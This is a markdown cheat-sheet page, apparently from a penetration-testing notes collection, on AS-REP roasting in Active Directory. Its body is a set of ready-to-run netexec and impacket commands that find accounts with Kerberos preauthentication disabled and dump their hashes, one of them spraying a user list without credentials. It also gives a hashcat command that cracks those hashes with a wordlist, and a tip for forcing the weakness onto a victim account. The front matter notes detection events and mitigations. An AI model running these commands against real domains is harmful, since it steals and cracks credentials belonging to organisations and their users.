---
title: AS-REP roasting
category: AD / Credentials
order: 20
tags: [kerberos, asrep, preauth, cracking, credentials]
summary: >
  Accounts with "Do not require Kerberos preauthentication" set will hand out an
  AS-REP encrypted with the user's key to anyone who asks — crackable offline.
prerequisites:
  - Network access to a DC ($dc_ip) — a domain account helps enumerate but is not strictly required to roast a known name
  - A target account with DONT_REQ_PREAUTH (userAccountControl 0x400000)
tools: [netexec, impacket (GetNPUsers), Rubeus, hashcat]
detection:
  - Event 4768 (AS-REQ) with preauth not required, RC4 (etype 23)
  - Accounts flagged DONT_REQUIRE_PREAUTH that shouldn't be
mitigation:
  - Remove "do not require preauth" wherever possible; strong passwords; AES
refs:
  - { label: "HackTricks — AS-REP Roast", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast" }
---

## Find and roast

```sh
# netexec — enumerate + roast preauth-disabled accounts
netexec ldap $dc_ip -u $user -p $password --asreproast asrep.txt
```

```sh
# impacket — with creds, enumerate the whole domain
GetNPUsers.py $domain/$user:$password -dc-ip $dc_ip -request -format hashcat -outputfile asrep.txt
# no creds — spray a userlist (only preauth-disabled accounts return a hash)
GetNPUsers.py $domain/ -usersfile users.txt -dc-ip $dc_ip -no-pass -format hashcat
```

## Crack offline

```sh
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --rules-file best64.rule
```

> If you can write a victim's `userAccountControl` (ACL edge), you can *set*
> DONT_REQ_PREAUTH yourself and then roast them — a targeted variant.
